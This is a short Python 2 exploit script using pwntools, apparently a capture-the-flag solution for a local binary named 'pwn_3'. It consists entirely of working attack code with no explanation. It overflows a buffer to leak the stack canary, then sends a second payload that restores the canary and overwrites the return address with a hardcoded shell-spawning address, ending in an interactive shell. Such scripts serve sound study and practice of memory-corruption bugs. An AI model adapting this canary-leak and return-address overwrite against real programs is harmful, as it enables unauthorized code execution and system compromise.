#! /usr/bin/env python2
#coding:utf-8
from pwn import *

context.log_level = 'debug'

getshell_address = 0x0804853b

def pwn():
    p = process('./pwn_3')
    payload1 = 'A'*41
    p.send(payload1)
    p.recvuntil(payload1)
    canary = u32('\x00'+p.recv()[0:3])
    # print canary.encode('hex')
    # print hex(canary)
    # gdb.attach(p)
    # pause()
    payload2 = 'A'*40+p32(canary)+'A'*12+p32(getshell_address)
    p.sendline(payload2)
    p.interactive()


if __name__ == "__main__":
    pwn()    